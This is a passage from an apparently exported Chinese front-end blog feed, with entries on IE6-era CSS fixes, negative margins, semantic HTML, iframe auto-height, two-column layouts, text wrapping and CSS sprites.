#333; &#125;*+html #div &#123; color: #999; &#125;* html #div &#123; color: #666; &#125;细节2一、IE6及以下不识别a 标签外的:hover伪类，在火狐，IE7里能正确达到效果，解决办法：123#show li.s1&#123; border:1px solid #ff9900; background:#454242;&#125;#show li.s2&#123; border:1px solid #D9D8D8; background:#312E2E;&#125;&lt; li&gt;&lt;/li&gt;二、为元素设置hasLayout很多IE6（或IE7）的问题可以用设置hasLayout值的方法来解决，最简单的给元素设置hasLayout值的方法是给加上CSS 的height或width(当然，zoom也可以用，但这不是CSS的一部分)。比如设置为height:1%。如果父元素没有设置高度，那么元素的物理高度并不会改变，但是，已经具备hasLayout属性。三、IE6下字符重复出现确保浮动元素设置了 display:inline;在浮动元素中使用 margin-right:-3px;四、样式优先级1，内联样式 [1.0.0.0]2，ID选择器 [0.1.0.0]3，类，属性，伪类 选择器 [0.0.1.0]4，元素标签，伪元素 选择器 [0.0.0.1]五、一个元素垂直居中的css写法1234567891011#exm&#123;position:absolute;left:50%;top:50%;z-index:1;width:200px;height:100px;margin-left:-100px;margin-top:-52px;&#125;六、zoom : normal | number设置或检索对象的缩放比例。设置或更改一个已被呈递的对象的此属性值将导致环绕对象的内容重新流动。虽然此属性不可继承，但是它会影响对象的所有子对象( children )。七、图片跟文字并排时, 要实现图片文字垂直居中:1&gt; 将line-height:设置成图片的高度,或者图片父元素的高度.2&gt; 再将图片的CSS设置vertical-align:middle;八、li 元素中包含 a img 元素的时候，IE6下出现空白解决方法 一使 li 浮动，并设置 img 为块级元素解决方法 二设置 ul 的 font-size:0;解决方法 三设置 img 的 vertical-align: bottom;解决方法 四设置 img 的 margin-bottom: -5px;细节3…一、被点击访问过的超链接样式不在具有hover和active解决方法：改变CSS属性的排列顺序: L-V-H-A二、FF下连续长字段不能自动换行解决方法：word-wrap:break-word;overflow:hidden;三、FF下父容器高度不能自适应解决办法：清除子元素的浮动四、IE下图片下方产生空隙解决办法：定义img 为display:block，或vertical-align为top/bottom/middle/text-bottom定义父容器的字体大小为零，font-size:0五、IE6下浮动元素和它相邻的非浮动元素之间有3px空隙解决办法：相邻的非浮动元素也设置浮动；浮动元素相对IE6定义_margin-right:-3px;六、LI内容超长后以省略号显示解决办法： white-space:nowrap;(文本不换行)text-overflow:ellipsis; -o-text-overflow:ellipsis; overflow: hidden;七、文本不能垂直居中解决办法：行高和容器高度相等line-height=height；八、文本输入框和相邻的文本不能对齐解决办法：设置文本输入框vertical-align:middle;九、IE设置滚动条样式解决办法：123456789body&#123;scrollbar-face-color:#f6f6f6;scrollbar-highlight-color:#fff;scrollbar-shadow-color:#eeeeee;scrollbar-3dlight-color:#eeeeee;scrollbar-arrow-color:#000;scrollbar-track-color:#fff;scrollbar-darkshadow-color:#fff;&#125;十、IE6无法定义高度为1px的容器解决办法：overflow:hiddenzoom:0.8line-height:1px细节4…一、让层显示在flash之上解决办法：给FLASH设置透明name="wmode" value="transparent"name="wmode" value="opaque" />```1234567891011二、使一个层垂直居中浏览器中解决办法：使用百分比绝对定位，与外补丁负值的方法。```cssposition:absolute;top:50%;left:50%;margin:-100px auto auto -100px;width:200px;height:200px;三、加入收藏夹解决办法：1234567891011121314151617&lt;script type="text/javascript"&gt;// &lt;![CDATA[function bookmark()&#123;var title=document.titlevar url=document.location.hrefif (window.sidebar) window.sidebar.addPanel(title, url,"");else if( window.opera &amp;amp;&amp;amp; window.print )&#123;var mbm = document.create_r_rElement_x('a');mbm.setAttribute('rel','sidebar');mbm.setAttribute('href',url);mbm.setAttribute('title',title);mbm.click();&#125;else if( document.all ) window.external.AddFavorite( url, title);&#125;// ]]&gt;&lt; /script&gt;&lt; a href="javascript:bookmark()"&gt;加入收藏夹&lt;/a&gt;细节51.常见新闻列表的写法：123456&lt;ul class="list"&gt;&lt; li&gt;&lt;span&gt;2006年6月6日 &lt;/span&gt;&lt;a href="http://www.52css.com/#"&gt;新闻标题01&lt;/a&gt;&lt;/li&gt;&lt; li&gt;&lt;span&gt;2006年6月6日 &lt;/span&gt;&lt;a href="http://www.52css.com/#"&gt;新闻标题02&lt;/a&gt;&lt;/li&gt;&lt; li&gt;&lt;span&gt;2006年6月6日 &lt;/span&gt;&lt;a href="http://www.52css.com/#"&gt;新闻标题03&lt;/a&gt;&lt;/li&gt;&lt; li&gt;&lt;span&gt;2006年6月6日 &lt;/span&gt;&lt;a href="http://www.52css.com/#"&gt;新闻标题04&lt;/a&gt;&lt;/li&gt;&lt; /ul&gt;2.IE实现页面背景渐变（FF及chrome不支持）从上到下：1body&#123;filter: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#ffffff,endColorStr=#000000);&#125;左上至右下：1FILTER: Alpha( style=1,opacity=25,finishOpacity=100,startX=50,finishX= 100,startY=50,finishY=100); background-color: skyblue;&#125;从左至右1body&#123;FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=1,startColorStr=#ffffff,endColorStr=#000000);&#125;从上到下1style="filter:progid:DXImageTransform.microsoft.gradient(gradienttype=0,startColorStr=blue,endColorStr=white);"3.a hover的样式实现多种效果，可以灵活运用12#outer a &#123; border:1px solid #069;&#125;#outer a:hover &#123;border:1px dashed #c00;&#125;4.border:none;与border:0区别理论上的性能差异:border:0;把border设为“0”像素虽然在页面上看不见，但按border默认值理解，浏览器依然对border-width/border-color进行了渲染，即已经占用了内存值。border:none;把border设为“none”即没有，浏览器解析“none”时将不作出渲染动作，即不会消耗内存值。兼容性差异：兼容性差异只针对浏览器IE6、IE7与标签button、input而言，在win、win7、vista 的XP主题下均会出现此情况。当border为“none”时似乎对IE6/7无效边框依然存在,当border为“0”时，感觉比“none”更有效，所有浏览器都一致把边框隐藏，如何让border:none;实现全兼容？只需要在同一选择符上添加背景属性即可5.css实现多列等高布局,正内边距与负外边距给每个需要实现等高的列应用样式：123456789106.position:relative;特殊用法？？？？```css* &#123;margin:0;padding:0;font:normal 12px/25px &quot;宋体&quot;;&#125;body &#123;background:#f8f8f8;&#125;ul &#123;list-style:none;width:300px;height:25px;margin:20px auto;&#125;li &#123;float:left;width:86px;height:25px;text-align:center;margin:0 -5px;display:inline;&#125;a &#123;color:#fff; float:left;width:86px;height:25px;top:0;left:0;background:url(***.gif) center center no-repeat;&#125;a:hover &#123;color:#000;background:url(***.gif) 0 0 no-repeat;width:86px;position:relative;&#125;细节61。innerText：从起始位置到结束位置的内容，不包含标签innerHTMLouterHTML:包含 innerHTML和标签id="test">test1test2```1234567test.innerText:test1 test2test.innerHTML:```&lt;span&gt;```test1```&lt;/span&gt;```test2test.outerHTML:```&lt;div id=&quot;test&quot;&gt;&lt;span&gt;test1&lt;/span&gt;test2&lt;/div&gt;2。Number（）：任何包含非数字字符的字符串做参数时，结果为NaNparseInt():从左到右尽可能多低把字符串转化为数字，直到遇到一个非数字时停止isNaN():参数不是一个数字时，返回true;3。a=23.50abctypeof(a)=StringparseFloat(a)=23.5parseInt(a)=23Number(a)=NaN4。JS变量名包含数字字母美元符下划线，不能以数字开头5。getElementsByTagName_r()需要等文档加载完毕后才能获取到6。nodeType：共12种，1表示元素节点，3表示文本节点nodeName：表示节点名称，如果是文本节点，则表示#textnodeValue：表示节点的值eg: 获取tagname为li的节点if(obj.nodeName.toLowerCase()==’li’){}改变P的文本内容 document.getElementsByTagName_r(‘p’)[0].firstchild.nodeValue=’’7。父节点到子节点childNodes：元素所有第一层子节点列表，不包括向下更深层次的子节点obj.firstChild=obj.childNodes[0]obj.lastChild=obj.childNodes[obj.childNodes.length-1]hasChildNodes() 判断元素是否有子节点，返回布尔值7。子节点到父节点var parentElm=myLinkItem.parentNode;while(parentElm,className!=‘syna’&amp;&amp;parentElm!=’document.body’)parentElm=parentElm.parentNode8。修改元素属性1）以对象属性的方式获取或设置123var mainImage=document.getElementByIdx_x('nav').getElementsByTagName['img'][0];mainImage.src='';mainImage.alt='';2)用getAttribute()和setAttribute()方法细节71。将数字转化为拥有X位小数位的形式12345678function roundTo(base,precision)&#123; var m=Math.pow(10,precision);var a=Math.round(base*m)/m;return a;&#125;var n=3.942487;roundTo(n,3)=3.942roundTo(n,0)=32。创建受约束的随机数12function randomBetween(min,max)&#123; return min+Math.floor(Math.random()*(max-min+1))&#125;3。数字转换为字符串12var a=10;a=String(a);/a=a.toString();4。对url的编码123var a="http://www.google.com/directoryname/?p=e";var b=escape(a);var c=(b);5。改变文档内元素的类型p—&gt;div首先创建一个div元素，然后复制p的子节点到div中，最后再用div 替换p6。一个函数需要多少参数12function add(n1,n2)&#123;&#125;return num=add.length;7。一个函数传入了多少参数12function add(n1,n2)&#123;return arguments.length;&#125;细节81). display:inline-block;顾名思义，就是在内联情况下的块状，可以设定高度宽度。123456.element-class &#123;display: -moz-inline-stack; //Firefox only codedisplay: inline-block; //some standard browserszoom: 1; //IE only*display: inline; //Only IE know this code (CSS Hack)&#125;2).清理浮动12.clearfix:after&#123;visibility:hidden;display:block;font-size:0;content:" ";clear:both;height:0;&#125;.clearfix &#123;zoom:1;&#125;3).在地址栏添加自定义图标首先，我们需要预先制作一个图标文件，大小为16*16像素。文件扩展名为ico，然后上传到相应目录中。在HTML源文件“Rel=”ICON NAME” href=”http://图片的地址（注意与刚才的目录对应）”>```，当然如果用户使用IE5或以上版本浏览时，就更简单了，只需将图片上传到网站根目录下，即可自动识别！1234564). 在IE6中设置display:block的空容器一个较小高度时，如```&lt;p style=”height:1px;”&gt;&lt;/p&gt;```，会发现其高度不能小于某个值。解决方案：设置overflow:hidden。5).文字用省略号截断```cssdiv&#123;width:200px;height:100px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;&#125;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css细节</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[语义化你的HTML标签]]></title>
    <url>%2F2015%2F07%2F13%2F%E8%AF%AD%E4%B9%89%E5%8C%96%E4%BD%A0%E7%9A%84html%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"><![CDATA[1、语义化HTML标签：1）HTML告诉我们的是一块内容是什么（或其意义），而不是它长的什么样子。2）写语义化的HTML结构其实很简单，首先要掌握HTML中各个标签的语义，在看到内容的时候想想用什么标签能更好的描述它，是什么就用什么标签。2、常用标签分类：1）、12345678910111213 2）、```&lt;p&gt;&lt;/p&gt;``` 作为段落标签，就不会再使用```&lt;br /&gt;```来换行了，不需要```&lt;br /&gt;``` 来区分段落与段落。p中的文字会自动换行，段落与段落之间的空隙也可以利用CSS来控制，很容易而且清晰的区分出段落与段落。 3）、```&lt;ul&gt;```无序列表，这个被大家广泛的使用，```&lt;ol&gt;```有序列表也有常用。在web标准化过程中，```&lt;ul&gt;``` 还被更多的用于【导航条】，相同结构的分类标签使用。 4）、自定义列表：```&lt;dl&gt;```、```&lt;dt&gt;```、```&lt;dd&gt;``` 通常自定义列表要比无序列表和有序列表用的少一些，如果需要解释一系列术语与解释的列表时，使用自定义列表就是很好的方法。```html&lt;dl&gt; &lt;dt&gt;列表中每个元素的标题&lt;/dt&gt; &lt;dd&gt;列表中元素的内容&lt;/dd&gt; &lt;dd&gt;列表中元素的内容&lt;/dd&gt; &lt;dd&gt;列表中元素的内容&lt;/dd&gt;&lt;/dl&gt;5）、strong >```强调标签：123456789101112131415161718192021222324252627 1)、em表示强调，strong表示更强烈的强调。并且在浏览器中，em默认用斜体表示，strong 用粗体表示。 2）、em 用来局部强调，strong 则是全局强调。从视觉上考虑，em 的强调是有顺序的，阅读到某处时，才会注意到。strong 的强调则是一种随意无顺序的，看见某文时，立刻就凸显出来的关键词句。 3）、em 表示内容的着重点（stress emphasis），strong 表示内容的重要性（strong importance），strong 不会改变所在句子的语意，em 则会改变所在句子的语义。 em 是句意强调，加与不加会引起语义变化。 strong 是重要性强调，和局部还是全局无关，局部强调用strong也可以，strong强调的是重要性，不会改变句意。 6）、合理使用&lt;table&gt;：如今，&lt;table&gt;的本义应当用作数据列表的地方，对于一些数据处理用&lt;table&gt;显得更加有序化和语义化。详情信息：http://www.smallni.com/talk-about-semantic/caption 标签 -- 定义HTML表格的标题```&lt;colgroup&gt;``` 标签用于对表格中的列进行组合，以便对其进行格式化。```&lt;colgroup&gt;``` 标签只能在 table 元素中使用。tabel属性： Common -- 一般属性 summary -- 代表表格的摘要说明 width -- 代表表格的宽度 border -- 代表表格边框(此属性应该使用CSS实现) cellspacing -- 表格边框与表格内容填充的距离,也是内容填充之间的距离(此属性应该使用CSS实现) cellpadding -- 内容填充的宽度(此属性应该使用CSS实现)```html&lt;table&gt; &lt;caption&gt;表格标题&lt;/caption&gt; &lt;tr&gt; &lt;td&gt;表格列&lt;/td&gt;&lt;td&gt;表格列&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;3、为神马要语义化？手持移动设备的无障碍阅读手持移动设备如PDA、智能手机等可能对CSS的解析能力较弱，这时可能就需要更语义的标签来体现一个页面的易读性盲人等一些障碍人士的阅读屏幕阅读器对不同标签所发出的声音是不同的，使用更语义的标签以能传达不同信息的重要性搜索引擎的友好收录虽然各大搜索引擎的排名规则不断的再变化，但规则里的正则始终是要匹配标签的，如果能用更语义的标签，蜘蛛爬行能够根据标签的使用来确定上下和各关键字的权重。技术趋势所趋正如html诞生时的初衷那样，各个标签的本义就是希望能在特定的地方使用合适的标签，而不是去用样式来表现一个不语义的标签。html5新增了更多的语义化的标签，原本用&lt;div id=”header”&gt;&lt;/div&gt;来实现的结构，通过html5的&lt;header&gt;标签我们可以更完美的表现。便于团队项目的可持续运作及维护语义化的命名能够使我们在多人协作一个项目时更加有序和快捷，而不需要去纠结另一位伙伴的CSS命名是什么意思。如果是个人项目，也便于后期其他同事的修改，语义化的命名时一个项目的可读性更高。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>html标签</tag>
        <tag>语义化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css中的负margin技术以及运用]]></title>
    <url>%2F2015%2F07%2F13%2Fcss%E4%B8%AD%E7%9A%84%E8%B4%9Fmargin%E6%8A%80%E6%9C%AF%E4%BB%A5%E5%8F%8A%E8%BF%90%E7%94%A8%2F</url>
    <content type="text"><![CDATA[刚刚开始学习css的时候，我采用了float为主来实现布局的方式，但是运用浮动很长一段时间之后，我发现这是一种被人牵着鼻子走的做法。至少，页面上不应过多的运用浮动，尤其是不要拿来确定整个布局。很简单的道理，当你用了float:left,后面的div很可能需要跟着用float:left，而且当宽度不够的时候，本来该和上一个div一个水平线上的div跑到下面去了，如果某个div有margin属性，还会遇到ie6那个烦人的bug。而且浮动之后，你还必须在合适的地方使用清除浮动。在网上看到了一篇讲负margin的文章，仔细研究之后，觉得很实用。我将那篇文章的内容提炼出来，原文写的很好，但是需要花很长的时间去阅读。为了形象、易懂的解释负margin，我们将引入W3C上没有的参考线的说法。何谓参考线？参考线就是margin移动的基准点，此基准点相对于box(自身)是静止的。而margin的数值，就是box相对于参考线的位移量。一个完整的margin属性是这么写的margin: top right bottom left;(eg: margin:10px 20px 30px 40px)。在margin属性中一共有两类参考线，top和left的参考线属于一类，right和bottom的参考线属于另一类。top和left是以外元素为参考，right和bottom是以元素本身为参考。margin的位移方向是指margin数值为正值时候的情形，如果是负值则位移方向相反。先看看一个完整的例子1234567891011121314151617181920&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;&lt;title&gt;Margin参考线举例说明&lt;/title&gt;&lt;style type="text/css"&gt;*&#123;margin:0; padding:0;&#125;.wrap&#123;width:400px; border:5px solid #aaa;&#125;.example&#123;width:200px; height:200px; background:#CCCCFF;&#125;.normal&#123;width:200px; height:200px; background:#CCE8CF;&#125;.example&#123;margin:-10px 20px -30px 40px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="wrap"&gt;&lt;div class="example"&gt;example元素：margin参考线举例说明文字，请查看此元素由于margin的变化所移动的位移量。&lt;/div&gt;&lt;div class="normal"&gt;一个普通的Box&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;来分析这段代码，example元素下方有一相邻元素normal（注：这里分析的是添加和删除margin后的example元素，normal元素仅作为example元素前后效果的参照）。根据上文的参考线原理margin:-10px(top) 20px(right) -30px(bottom) 40px(left);上-10px和左40px将以外元素为参考，所谓外元素就是本元素的边界元素（再白话点的解释就是元素的紧邻元素，这里涉及到containing block知识，可自行网上搜索）。example元素上边和左边的边界元素即为wrap父元素，wrap父元素为基准点，example的margin-top为-10px，想象下如果这里margin-top为+10px会什么情况，没错如果为+10px，example元素相对于wrap父元素边缘为基准，那么example元素会同wrap父元素10px产生间隙边距，那么反过来，margin-tip:-10px;还是与wrap父元素边缘为基准，反过来向上推10px的距离位置。example元素的margin-left为40px，这里就按照正常逻辑相隔40px边距，同理如果为-40px，那么就是反方向向左推进40px的距离位置。再来看example元素的margin-right和margin-bottom，由上文得知这俩个值是以元素本身为参考。什么叫以元素本身为参考呢，确切含义是指以自身为参考来影响周围元素的位置（实质即为影响下边和右边相邻元素的参考线）。这里的margin-bottom为-30px，对于其自身位置没有任何变化，但是对于其下方元素normal元素产生了极大的影响，因为normal元素的上边界元素即为example元素，根据example元素边界来判定自身位置，想象下如果example元素margin-bottom为+30px，那么example元素将隔开下方的normal元素，反之为-30px，下方normal元素由于example参考线内凹，导致了normal元素自个儿身不由己的被“提”了上去了。这就是以自身为参考影响周围元素位置的含义。当margin四个值都为正数值的话，那么margin按照正常逻辑同周围元素产生边距。当元素margin的top和left是负值时会引起元素的向上或向左位置移动。而当元素margin的bottom和right是负值时会影响右边和下边相邻元素的参考线。接下来我们将利用两个例子深入讲解负margin技术的应用领域。负margin在Tab选项卡中的应用：最核心的就是下方俩行高亮部分代码，第二行的margin-bottom:-1px;使下方的正文部分向上“提”了1px的距离，从而达到了鼠标上移后选项卡白色遮住下方黑色边框的效果（注：由于IE不是符合W3C标准，所以当鼠标移到选项卡上时需要添加一个额外属性position:relative;来修复IE不覆盖下方边框的这个Bug）。第四行的margin-left:-1px;的目的是让四个选项卡向左移动1px的距离，达到左右都只有一条分割线的效果。123456789.demoTab&#123;width:400px; font:14px/1.5 Microsoft YaHei,verdana,Helvetica,Arial,sans-serif;&#125;.demoTab .demoTabHd&#123;margin-bottom:-1px; border:1px solid #6C92AD; border-bottom:none; background:#EAF0FD;&#125;.demoTab .demoTabNav&#123;height:28px; overflow:hidden; *zoom:1;&#125;.demoTab .demoTabList&#123;float:left; margin-left:-1px; padding:0 22px; line-height:28px; border-left:1px solid #6C92AD; border-right:1px solid #6C92AD; font-weight:bold; color:#005590; text-align:center; cursor:pointer;&#125;.demoTab .demoTabList.current&#123;position:relative; background:#fff;&#125;.demoTab .demoTabBd&#123;border:1px solid #6C92AD;&#125;.demoTab .demoTabBd .roundBox&#123;padding:15px;&#125;.demoTab .demoTabContent&#123;display:none;&#125;.demoTab .demoTabContent.current&#123;display:block;&#125;HTML代码：123456789101112131415161718&lt;div id="demoTab" class="demoTab"&gt;&lt;div class="demoTabHd"&gt;&lt;ul class="demoTabNav clearfix"&gt;&lt;li class="demoTabList current"&gt;前端&lt;/li&gt;&lt;li class="demoTabList"&gt;实战&lt;/li&gt;&lt;li class="demoTabList"&gt;交互&lt;/li&gt;&lt;li class="demoTabList"&gt;优化&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;div class="demoTabBd"&gt;&lt;div class="roundBox"&gt;&lt;div class="demoTabContent current"&gt;这是第一个选项卡的内容。&lt;/div&gt;&lt;div class="demoTabContent"&gt;这是第二个选项卡的内容。&lt;/div&gt;&lt;div class="demoTabContent"&gt;这是第三个选项卡的内容。&lt;/div&gt;&lt;div class="demoTabContent"&gt;这是第四个选项卡的内容。&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;利用负margin制作自适应左右布局：12345.demoLayout&#123;width:500px; border:1px solid #aaa; background:#EEEEEE;&#125;.demoLayout .roundBox&#123;padding:10px; min-height:170px; _height:170px;&#125;.demoLayout .demoShowPic img&#123;padding:1px; border:1px solid #DAA520;&#125;.demoText&#123;margin:-170px 0 0 215px;&#125;.demoLayoutBtn&#123;margin:15px 0 0 0;&#125;&nbsp;123456&lt;div id="demoLayout" class="demoLayout"&gt;&lt;div class="roundBox"&gt;&lt;div class="demoShowPic"&gt;&lt;img width="200" height="166" src="toygersKittens.jpg" alt="toygers kittens" /&gt;&lt;/div&gt;&lt;div class="demoText"&gt;利用负margin制作自适应左右布局&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;如上例这类布局效果（左边一个固定图片，右边为内容），负margin能够替代float浮动布局，进行左右布局规划，并且拥有float所没有的自适应效果。根据上面的几个实例，相信你已经对负margin技术有了一个比较完整的理解。负margin不但可以做出一般CSS属性所不能达到的效果还能够化繁为简、化腐朽为神奇之奇效，当然负margin用到的地方不仅仅是这些，还有许多效果都是需要负margin技术来实现的，只要你耐心的去实践去探索，相信你会发现更多负margin用到得场合。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>负margin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何让iframe自适应高度_iframe去掉滚动条]]></title>
    <url>%2F2015%2F07%2F13%2F%E5%A6%82%E4%BD%95%E8%AE%A9iframe%E8%87%AA%E9%80%82%E5%BA%94%E9%AB%98%E5%BA%A6-iframe%E5%8E%BB%E6%8E%89%E6%BB%9A%E5%8A%A8%E6%9D%A1%2F</url>
    <content type="text"><![CDATA[如何让iframe自适应高度_iframe去掉滚动条1&lt;iframe id="frame1" src="###.html" width="640" scrolling="no" frameborder="0"&gt;&lt;/iframe&gt;123456789101112&lt;script type="text/javascript"&gt;function reinitIframe()&#123;var iframe = document.getElementById("frame1");try&#123;var bHeight = iframe.contentWindow.document.body.scrollHeight;var dHeight = iframe.contentWindow.document.documentElement.scrollHeight;var height = Math.max(bHeight, dHeight);iframe.height = height;&#125;catch (ex)&#123;&#125;&#125;window.setInterval("reinitIframe()", 200);&lt;/script&gt;iframe去掉滚动条1&lt;iframe name="leftframe" marginwidth=10 marginheight=10 src="1.asp" frameborder=no width="100%" scrolling="no" height=100%&gt;&lt;/iframe&gt;设置frameborder=no就可以了！希望对你有用！]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>iframe</tag>
        <tag>滚动条</tag>
        <tag>高度</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css 左右两栏 左边固定右边自适应]]></title>
    <url>%2F2015%2F07%2F13%2Fcss-%E5%B7%A6%E5%8F%B3%E4%B8%A4%E6%A0%8F-%E5%B7%A6%E8%BE%B9%E5%9B%BA%E5%AE%9A%E5%8F%B3%E8%BE%B9%E8%87%AA%E9%80%82%E5%BA%94%2F</url>
    <content type="text"><![CDATA[两个div并排，左边为绝对宽度，右边为相对宽度，这个问题，我也经常遇到，我一般的处理方法是将最大的容器padding-left固定宽度，左边的固定宽度的一块position:absolute，然后right的一块width为百分百今天学习到人家有三种解决方法，转载过来两个div并排，很容易实现。如何让左边的div为固定宽度，右边的div为相对宽度呢？需要用到这种布局的情况比较多见，如左边为导航，右边为内容的页面。暂时想到了两种实现办法。方法一，使用position:absolute。代码如下。1234567body&#123; margin:0; height:100%&#125;html&#123; height:100%&#125; /*兼容firefox的div高度100%*/#left&#123; **position:absolute**; top:0; left:0; width:200px; height:100%; background-color:#CCCCCC&#125;#right&#123; **margin-left:200px**; height:100%; background-color:#0099FF&#125;&lt;/style&gt;&lt;div id="left"&gt;left&lt;/div&gt;&lt;div id="right"&gt;right&lt;/div&gt;这段代码主要涉及到以下两点点比较重要的：（1）兼容firefox实现div高度100%；（2）div绝对定位的妙用；在页面布局的时候，position:absolute如果灵活的应用，可以达到很好的效果。方法二 使用float解决div左右布局，左为绝对宽度，右为相对宽度问题123456789&lt;style type="text/css"&gt;body&#123; margin:0; height:100% &#125;html&#123; height:100% &#125;#left&#123; width:150px; height:100%; float:left; _margin-right:-3px; background-color: yellow &#125;#main&#123; height:100%; background-color: green &#125;&lt;/style&gt;&lt;div align="left"&gt;&lt;div id="left"&gt;&lt;/div&gt;&lt;div id="main"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div align="left"&gt;方法三，代码如下。方法二可能没有按照题目要求，但是可以达到一样的页面效果。主要是使用了div的float属性。12345678910&lt;style&gt;body&#123; margin:0; height:100%&#125;html&#123; height:100%&#125; /*兼容firefox的div高度100%*/#left&#123; width:200px; height:100%; background-color:#CCCCCC; float:left&#125;#main&#123; width:100%; height:100%; background-color:#0099FF&#125;&lt;/style&gt;&lt;div id="main"&gt;&lt;div id="left"&gt;left&lt;/div&gt;Right&lt;/div&gt;&lt;/div&gt;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>左右自适应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css中英文字母和汉字行高不一样的解决办法]]></title>
    <url>%2F2015%2F07%2F13%2Fcss%E4%B8%AD%E8%8B%B1%E6%96%87%E5%AD%97%E6%AF%8D%E5%92%8C%E6%B1%89%E5%AD%97%E8%A1%8C%E9%AB%98%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[最近在写一个css的时候遇到一个问题：英文字母和汉字的行高不一样，导致在全汉字、全英文字母以及汉字字母混合时设置好的margin或padding 属性出现偏差…当然这种情况之存在于IE浏览器，Safari、Google Chrome、Firefox、Opera均不存在类似的问题产生的原因：全汉字的时候：一般情况在选中文本可以看出汉字是上对齐的（具体表现是选中字体，从背景上看上去下面多了一部分，用css术语讲就是产生了padding-bottom属性，为了说明问题暂且就说存在padding属性吧）。全英文字母的时候：类似于全汉字在全英文的情况下是下对齐，会出现类似padding-top的属性。不管是全汉字还是全英文这时候的行高是一样的。字母汉字混合：但是如果把汉字和英文字母混合在一起的时候就可以看出来差别了，这时候再选中所有字体就可以看出来这时候是的补白是 padding=padding-top+padding-bottom,也就是会多出来一个padding-top（也可以说是padding- bottom），一般字体在12px的情况下，多出来的部分大概是2px。解决办法：更改字体：本来想使用line-height固定的，但是line-height是每一行的基线与基线之间的距离，又因为汉字的基线和英文字母是不同的，所以起不到作用，再说如果是用作导航菜单只有一行还是没有用的。这样只有从字体上下手了，还真有一种字体可以解决这个问题，这个字体就是“simsun”，“simsun”就是传说已久的“宋体”，在windows字体文件夹下“宋体”的文件名就是“simsun”，他的兄弟“simhei”就是通常说的“黑体”。所以，解决办法就是把font-family设置成“simsun”，这可能会损失一些效果，没办法如果谁有更好的解决办法可以指教一下。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>行高不一样</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS纯英文数字自动换行]]></title>
    <url>%2F2015%2F07%2F13%2Fcss%E7%BA%AF%E8%8B%B1%E6%96%87%E6%95%B0%E5%AD%97%E8%87%AA%E5%8A%A8%E6%8D%A2%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[当一个定义了宽度的块状元素中填充的全部为纯英文或者纯数字的时候，在IE和FF中都会撑大容器，不会自动换行并且当数字或者英文中带有汉字时，会从汉字处换行，而纯汉字却可以自动换行。这个问题如何解决？先来认识一下两位主角word-wrap和word-breakword-wrap用来控制换行两种取值：(1)normal(2)break-word（此值用来强制换行，内容将在边界内换行，中文没有任何问题，英文语句也没问题。但是对于长串的英文，就不起作用。）word-break用来控制断词三种取值：(1)normal(2)break-all（是断开单词。在单词到边界时，下个字母自动到下一行。主要解决了长串英文的问题。）(3)keep-all（是指Chinese, Japanese, and Korean不断词，一句话一行，可以用来排列古诗哟~）【解决方法】可以在CSS中加入12word-wrap:break-word;word-break:break-all;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>自动换行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS sprite 及图片优化那些事]]></title>
    <url>%2F2015%2F07%2F13%2Fcss-sprite-%E5%8F%8A%E5%9B%BE%E7%89%87%E4%BC%98%E5%8C%96%E9%82%A3%E4%BA%9B%E4%BA%8B%2F</url>
    <content type="text"><![CDATA[CSS图片优化就是尽量压缩图片的大小，加快页面加载速度，这对于大型网站是很有用的。不要小看它，它可以大大提高网页加载速度。通常大家用到的方法就是css sprites。CSS Sprites(图片整合技术)的目的就是通过整合图片，减少对服务器的请求数量，从而加快页面加载速度。想必很多人已经在用这个技术，我给大家简单介绍一下，总结一下我使用css sprite时的一些技巧。CSS Sprites实现方法：首先将小图片整合到一张大的图片上，然后根据具体图标在大图上的位置，给背景定位。CSS Sprites技术要点总结：1. 小图片整合时，按照从上到下的顺序，而不要一个图片挨着一个图片从左到右排列。这样排列background-position的值一目了然，写css时方便许多。同时也是为了后期维护着想。想象一下，如果后期维护时，改动其中某个图片的尺寸，那么周围的所有元素的background-position就会随之改变，这将会是一件很头疼的事情。2. 小图片整合时尽量靠最左边或者最右边。这两个位置很灵活，非常适合摆放文本前的icon，再写样式时不会受到其它CSS Sprites图片干预。综合第1点，我们可以沿着最左边和最右边的两侧开始由上至下整合图片。3. 不建议在不同小图片上下留间隔。因为这样会导致图片size增大从而增加文件的大小。这些间隔是没有必要存在的。4. 